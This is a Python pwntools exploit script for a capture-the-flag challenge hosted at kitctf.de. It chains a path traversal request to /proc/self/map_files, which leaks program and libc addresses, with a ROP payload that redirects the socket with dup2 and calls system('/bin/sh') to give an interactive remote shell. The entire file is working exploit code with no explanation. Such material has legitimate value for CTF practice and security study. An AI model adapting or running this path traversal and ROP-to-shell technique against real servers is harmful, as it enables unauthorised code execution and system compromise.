#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("main")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


if args.REMOTE:
  host, port = "baby-ROP-but-unexploitable-0.chals.kitctf.de", "1337"
elif args.DOCKER:
  host, port = "127.0.0.1", "1336"

if args.REMOTE:
  q = remote(host,port, ssl=True)
elif args.DOCKER:
  q = remote(host,port)
else:
  p = process([exe.path])
  sleep(1)
  q = remote("127.0.0.1", 1337)

# first leak program mapping via /proc/self/map_files
payload = "GET /../../../../../../../proc/self/map_files/ HTTP/1.1\r\n\r\n"
q.send(payload)
# get program base
q.recvuntil('<li> <a href="..">..</li>\n  <li> <a href="', drop=True)
exe.address = int(q.recvuntil('-', drop=True),16)
logleak('prog base', exe.address)

# get libc base
for i in range(5):
 q.recvuntil('  <li> <a href="', drop=True)
libc.address = int(q.recvuntil('-', drop=True),16)
logbase()
q.recvuntil('</body>\n', drop=True)
q.close()

# connect again
if args.REMOTE:
  q = remote(host,port, ssl=True)
elif args.DOCKER:
  q = remote(host,port)
else:
  q = remote('127.0.0.1', 1337)


payload = b"POST /../../../../../../../proc/self/map_files HTTP/1.1\r\n\r\n\r\n"
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
fd = 4
payload += p64(pop_rdi)+p64(fd)+p64(pop_rsi)+p64(0)+p64(libc.sym[b'dup2'])
payload += p64(pop_rdi)+p64(fd)+p64(pop_rsi)+p64(1)+p64(libc.sym[b'dup2'])
payload += p64(pop_rdi)+p64(next(libc.search(b'/bin/sh')))+p64(ret)+p64(libc.sym[b'system'])
q.send(payload)
q.recvuntil('</body>\n', drop=True)

# enjoy shell
q.interactive()

